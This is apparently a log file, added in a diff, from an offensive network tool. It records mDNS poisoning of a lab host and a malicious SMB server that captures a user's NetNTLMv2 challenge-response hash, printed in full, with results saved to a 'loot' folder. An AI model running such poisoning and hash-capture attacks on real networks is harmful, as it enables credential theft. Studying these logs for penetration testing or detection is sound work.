+2022-03-02 20:26:24.805 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:26:24.807 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:26:24.817 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:26:24.818 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:26:24.824 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:26:24.825 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:26:25.809 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:26:25.810 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:26:25.815 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:26:25.816 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:26:34.369 | INFO     | impacket.smbserver:smbComTreeDisconnect:1921 - Disconnecting Share(1:IPC$)
+2022-03-02 20:26:34.369 | INFO     | impacket.smbserver:smbComTreeDisconnect:1921 - Disconnecting Share(1:IPC$)
+2022-03-02 20:26:34.379 | INFO     | impacket.smbserver:finish:3798 - Closing down connection (192.168.253.138,50496)
+2022-03-02 20:26:34.379 | INFO     | impacket.smbserver:finish:3798 - Closing down connection (192.168.253.138,50496)
+2022-03-02 20:26:34.384 | INFO     | impacket.smbserver:removeConnection:3946 - Remaining connections []
+2022-03-02 20:26:34.384 | INFO     | impacket.smbserver:removeConnection:3946 - Remaining connections []
+2022-03-02 20:26:35.720 | WARNING  | project.network.mitm.mss:__synchronous_attack:75 - Exiting attack ...
+2022-03-02 20:26:35.720 | WARNING  | project.network.mitm.mss:__synchronous_attack:75 - Exiting attack ...
+2022-03-02 20:26:54.400 | DEBUG    | project.network.mitm.mss:do_mss:201 - Starting malicious smb server attack using ip: 192.168.253.135 
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-03-02 20:26:54.402 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 20:26:54.410 | INFO     | project.network.mitm.mss:__wrapper_attack:87 - Running mss the results will be saved in : loot/
+2022-03-02 20:26:54.410 | INFO     | project.network.mitm.mss:__wrapper_attack:87 - Running mss the results will be saved in : loot/
+2022-03-02 20:26:54.436 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:62 - Starting Malicious SMB Server ...
+2022-03-02 20:26:54.436 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:62 - Starting Malicious SMB Server ...
+2022-03-02 20:26:54.439 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 20:26:54.439 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 20:26:54.440 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 20:26:54.440 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 20:26:54.440 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 20:26:54.440 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 20:27:08.307 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:27:08.307 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:27:08.307 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 20:27:08.344 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:27:08.344 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:27:08.344 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 20:27:08.376 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:27:08.376 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:27:08.377 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:27:08.378 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:27:09.321 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:27:09.321 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:27:09.322 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50497)
+2022-03-02 20:27:09.322 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50497)
+2022-03-02 20:27:09.323 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:27:09.323 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:27:09.350 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 20:27:09.350 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 20:27:09.353 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 20:27:09.353 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 20:27:09.357 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:16557165a56f98a7a8fe7495efa05219:0101000000000000800c13e4732ed80131c6ee5c058b497e0000000001001000740067006f0062004f00700062004a0003001000740067006f0062004f00700062004a00020010005500610042004b005400490061005800040010005500610042004b00540049006100580007000800800c13e4732ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a0010000000000000000000000000000000000009001e0063006900660073002f0063006f00730061002e006c006f00630061006c000000000000000000
+2022-03-02 20:27:09.357 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:16557165a56f98a7a8fe7495efa05219:0101000000000000800c13e4732ed80131c6ee5c058b497e0000000001001000740067006f0062004f00700062004a0003001000740067006f0062004f00700062004a00020010005500610042004b005400490061005800040010005500610042004b00540049006100580007000800800c13e4732ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a0010000000000000000000000000000000000009001e0063006900660073002f0063006f00730061002e006c006f00630061006c000000000000000000
+2022-03-02 20:27:09.385 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 20:27:09.385 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 20:27:09.431 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:27:09.431 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:27:09.432 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:27:09.433 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:27:09.434 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:27:09.434 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:27:09.435 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:27:09.435 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:27:10.446 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:27:10.446 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:27:10.447 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:27:10.447 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:27:20.090 | INFO     | impacket.smbserver:smbComTreeDisconnect:1921 - Disconnecting Share(1:IPC$)
+2022-03-02 20:27:20.090 | INFO     | impacket.smbserver:smbComTreeDisconnect:1921 - Disconnecting Share(1:IPC$)
+2022-03-02 20:27:20.101 | INFO     | impacket.smbserver:finish:3798 - Closing down connection (192.168.253.138,50497)
+2022-03-02 20:27:20.101 | INFO     | impacket.smbserver:finish:3798 - Closing down connection (192.168.253.138,50497)
+2022-03-02 20:27:20.102 | INFO     | impacket.smbserver:removeConnection:3946 - Remaining connections []
+2022-03-02 20:27:20.102 | INFO     | impacket.smbserver:removeConnection:3946 - Remaining connections []
+2022-03-02 20:27:40.345 | DEBUG    | project.network.mitm.mss:do_mss:201 - Starting malicious smb server attack using ip: 192.168.253.135 
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-03-02 20:27:40.346 | SUCCESS  | project.network.mitm.mss:__end_process_in_the_background:112 - Finishing attack in the background ...
+2022-03-02 20:27:40.346 | SUCCESS  | project.network.mitm.mss:__end_process_in_the_background:112 - Finishing attack in the background ...
+2022-03-02 20:28:04.421 | DEBUG    | project.network.poison.poisonselector:do_poison:202 - Starting poison attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 20:28:04.421 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:84 - Finishing attack in the background ...
+2022-03-02 20:28:04.421 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:84 - Finishing attack in the background ...
+2022-03-02 20:32:59.980 | DEBUG    | project.network.poison.poisonselector:do_poison:202 - Starting poison attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 20:32:59.981 | INFO     | project.shell.igris:show_settable_variables_necessary:270 - Showing necessary settable variables
+2022-03-02 20:32:59.981 | INFO     | project.shell.igris:show_settable_variables_necessary:270 - Showing necessary settable variables
+2022-03-02 20:40:05.882 | DEBUG    | project.utils.neo.dboperations:__init__:30 - The neo4j dirver has been created successfully
+2022-03-02 20:40:20.725 | DEBUG    | project.network.poison.poisonselector:do_poison:209 - Starting poison attack using lhost: aldkjf ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 20:45:23.656 | DEBUG    | project.utils.neo.dboperations:__init__:30 - The neo4j dirver has been created successfully
+2022-03-02 20:45:30.694 | DEBUG    | project.network.poison.poisonselector:do_poison:212 - Starting poison attack using lhost: jakldj ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 20:45:30.695 | ERROR    | project.network.poison.poisonselector:__checking_conditions_for_attack:121 - Not valid LHOST
+2022-03-02 20:45:41.239 | DEBUG    | project.utils.neo.dboperations:__init__:30 - The neo4j dirver has been created successfully
+2022-03-02 20:45:42.934 | DEBUG    | project.network.poison.poisonselector:do_poison:212 - Starting poison attack using lhost: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 20:45:42.935 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 20:45:42.948 | INFO     | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:155 - Starting mdns poisoning...
